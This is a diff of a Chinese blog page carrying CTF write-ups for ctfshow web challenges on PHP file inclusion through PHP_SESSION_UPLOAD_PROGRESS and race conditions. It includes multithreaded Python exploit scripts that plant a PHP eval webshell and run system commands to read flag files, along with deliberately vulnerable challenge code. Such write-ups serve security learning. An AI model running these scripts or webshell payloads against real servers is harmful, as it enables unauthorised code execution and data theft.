class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure>
 <p><strong>考查</strong>：利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>进行文件包含</p>
@@ -103,303 +291,303 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><lin
 <li>前提: 需要知道session文件的存放位置。</li>
 <li>思路: 利用session.upload_progress将恶意语句写入session文件，从而包含session文件。</li>
 </ul>
-<p>session.upload_progress 是PHP5.4的新特征。<br><img src="https://img-blog.csdnimg.cn/2021052021583531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>php.ini</p>
+<p>session.upload_progress 是PHP5.4的新特征。<br><img src="https://img-blog.csdnimg.cn/2021052021583531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>php.ini</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span>session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。<span class="hljs-number">1.</span> session.upload_progress.enabled = on<br>enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；<br><br><span class="hljs-number">2.</span> session.upload_progress.cleanup = on<br>cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；<br><br><span class="hljs-number">3.</span> session.upload_progress.prefix = <span class="hljs-string">&quot;upload_progress_&quot;</span><br>prefix+name将表示为session中的键名<br><br><span class="hljs-number">4.</span> session.upload_progress.name = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br>name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；<br><br><span class="hljs-number">5.</span>session.use_strict_mode=off<br>这个选项默认值为off，表示对Cookie中sessionid可控。<br></code></pre></td></tr></table></figure>
 <p>一个上传进度数组的结构的例子</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">#PHPSESSION = Sn0w<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&lt;?php echo ini_get(&quot;</span><span class="hljs-attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;<br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>
-<p>在session中存放的数据<br><img src="https://img-blog.csdnimg.cn/2021052022111369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在<code>session.upload_progress.name=&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</code>的条件下,上传文件，便会在<code>session[&#39;upload_progress_123&#39;]</code>中储存一些本次上传相关的信息,储存在<code>/tmp/sess_Sn0w</code>中</p>
+<p>在session中存放的数据<br><img src="https://img-blog.csdnimg.cn/2021052022111369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在<code>session.upload_progress.name=&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</code>的条件下,上传文件，便会在<code>session[&#39;upload_progress_123&#39;]</code>中储存一些本次上传相关的信息,储存在<code>/tmp/sess_Sn0w</code>中</p>
 <p>Session的默认保存路径<br>在php.ini里的配置session.save_path是注释掉的，那么Seesion保存的路径在不同类型操作系统保存在什么位置？</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux：<br>/tmp 或 /var/lib/php/session<br><br>Windows：<br>C:\WINDOWS\Temp<br></code></pre></td></tr></table></figure>
-<p>在本地phpstudy中找到session的存储位置<br><img src="https://img-blog.csdnimg.cn/20210520220749657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>理论具体参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/u5013914/sn0w/blh341#LbWIR">https://www.yuque.com/u5013914/sn0w/blh341#LbWIR</a></p>
+<p>在本地phpstudy中找到session的存储位置<br><img src="https://img-blog.csdnimg.cn/20210520220749657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>理论具体参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/u5013914/sn0w/blh341#LbWIR">https://www.yuque.com/u5013914/sn0w/blh341#LbWIR</a></p>
 <p>解题方法1：burpsite条件竞争</p>
 <p>本地html向指定网址上传文件</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://f0ea2244-d2b8-43be-8ec6-f61da1585183.chall.ctf.show:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
-<p>bp设置，Cookie里设置<code>PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>，利用session.upload_progress写入恶意语句<br><img src="https://img-blog.csdnimg.cn/2021052013092414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>GET方式访问?file=/tmp/sess_flag<br><img src="https://img-blog.csdnimg.cn/20210520130945799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在默认情况下，<code>session.upload_progress.cleanup</code>是开启的，一旦读取了所有POST数据，它就会清除进度信息，利用条件竞争应付这种情况<br><img src="https://img-blog.csdnimg.cn/20210520131009940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>知道目录文件名为flag.php，修改一句话木马为cat flag.php,继续竞争读取flag<br><img src="https://img-blog.csdnimg.cn/20210520131709942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解题方法2：python脚本实现竞争</p>
+<p>bp设置，Cookie里设置<code>PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>，利用session.upload_progress写入恶意语句<br><img src="https://img-blog.csdnimg.cn/2021052013092414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>GET方式访问?file=/tmp/sess_flag<br><img src="https://img-blog.csdnimg.cn/20210520130945799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>在默认情况下，<code>session.upload_progress.cleanup</code>是开启的，一旦读取了所有POST数据，它就会清除进度信息，利用条件竞争应付这种情况<br><img src="https://img-blog.csdnimg.cn/20210520131009940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>知道目录文件名为flag.php，修改一句话木马为cat flag.php,继续竞争读取flag<br><img src="https://img-blog.csdnimg.cn/20210520131709942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>解题方法2：python脚本实现竞争</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://352c5d9e-8728-47e3-b3e5-7e8934e06141.node3.buuoj.cn/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure>
-<p>读到flag.php<br><img src="https://img-blog.csdnimg.cn/20210520223912589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改一句话木马为cat flag.php，读取flag<br><img src="https://img-blog.csdnimg.cn/20210520224545601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>读到flag.php<br><img src="https://img-blog.csdnimg.cn/20210520223912589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>修改一句话木马为cat flag.php，读取flag<br><img src="https://img-blog.csdnimg.cn/20210520224545601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <h3 id="ctfhshow-web入门-web82"><a href="#ctfhshow-web入门-web82" class="headerlink" title="ctfhshow [web入门]-web82"></a>ctfhshow [web入门]-web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>通过观察代码，可以看到过滤了大部分的文件包含函数，这里我们利用PHP_SESSION_UPLOAD_PROGRESS和条件竞争进行文件包含。</p>
 <p>和上面题一样，直接一把梭</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://4bd1dd58-0b1c-4019-8f55-44ad4dbea031.challenge.ctf.show:8080/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure>
-<p>接下来修改代码读取fl0g.php<br><img src="https://img-blog.csdnimg.cn/2021052022574475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>接下来修改代码读取fl0g.php<br><img src="https://img-blog.csdnimg.cn/2021052022574475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <h3 id="ctfhshow-web入门-web149"><a href="#ctfhshow-web入门-web149" class="headerlink" title="ctfhshow [web入门]-web149"></a>ctfhshow [web入门]-web149</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br>file_put_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
 <p>使用bp不断访问并传参，然后开一个去不断访问 1.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf=<span class="hljs-number">1.</span>php<br>show=<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;tac /c*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>利用脚本实现</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://ae3929ad-8f8f-4dc5-88c9-511d15e5625d.chall.ctf.show:8080/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        data = &#123;<br>            <span class="hljs-string">&#x27;show&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php system(&quot;ls /&quot;);?&gt;&#x27;</span><br>        &#125;<br>        W_reponse = requests.post(url+<span class="hljs-string">&quot;?ctf=1.php&quot;</span>,data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        R_reponse = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>        <span class="hljs-keyword">if</span> R_reponse.status_code != <span class="hljs-number">404</span>:<br>            print(R_reponse.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;[*]continued&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 通过threading.Event()可以创建一个事件管理标志，该标志（event）默认为False</span><br>    event = threading.Event()<br>    <span class="hljs-comment"># 将event的标志设置为True，调用wait方法的所有线程将被唤醒；</span><br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=write).start()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=read).start()<br></code></pre></td></tr></table></figure>
-<p>跑脚本，发现了ctfshow_fl0g_here.txt文件<br><img src="https://img-blog.csdnimg.cn/20210425193008262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>修改为cat /ctfshow_fl0g_here.txt继续跑脚本，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210425193100247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
